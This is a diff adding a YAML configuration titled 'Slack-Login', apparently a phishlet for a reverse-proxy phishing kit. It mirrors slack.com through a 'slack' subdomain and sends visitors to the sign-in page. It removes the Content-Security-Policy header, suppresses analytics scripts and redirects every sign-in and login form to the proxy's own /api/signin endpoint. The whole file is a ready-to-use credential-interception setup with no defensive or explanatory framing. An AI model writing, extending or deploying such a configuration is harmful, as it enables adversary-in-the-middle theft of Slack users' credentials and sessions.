@@ -1,0 +1,20 @@
+name: "Slack-Login"
+author: "Vanta v5"
+min_ver: "5.0.0"
+proxy_hosts:
+  - subdomain: "slack"
+    target: "slack.com"
+auth_urls: ["/signin"]
+landing_path: ["/signin"]
+auth_tokens: []
+credentials: []
+injections: []
+headers:
+  - {action: "remove", name: "Content-Security-Policy"}
+path_rewrites:
+  - {pattern: "^/$", replace: "/signin", methods: ["GET"]}
+cookie_rewrites: []
+blocklist:
+  - {pattern: "analytics|/track|/stats", mimes: ["text/javascript"], max_kb: 512}
+form_actions:
+  - {selector: "form[action*=\"signin\"], form[action*=\"login\"]", action_to: "/api/signin"}
